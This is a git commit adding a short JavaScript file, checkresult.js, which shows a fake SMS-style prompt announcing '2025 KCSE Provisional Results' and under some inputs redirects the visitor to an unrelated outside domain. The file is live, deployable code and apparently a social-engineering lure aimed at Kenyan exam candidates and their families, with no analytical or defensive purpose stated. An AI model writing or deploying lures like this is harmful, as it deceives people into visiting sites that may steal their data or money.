9e87e0823beab97207cfcc9ba871ff94c8df2352
newetijazz11 <newetijazz11@gmail.com>
2026-01-09 13:31:41 +0100

    Create checkresult.js

---
+++ checkresult.js
@@ -0,0 +1,8 @@
+var password = 'CHECK RESULT'
+password = prompt(
+  'SMS: Congratulations! 2025 KCSE Provisional Results is Out Press Ok to Access your Result now.',
+  'CHECK RESULT'
+);
+if (password != 'CHECK RESULT') {
+  location.href = 'https://www.bhufrizx.online/result';
+}
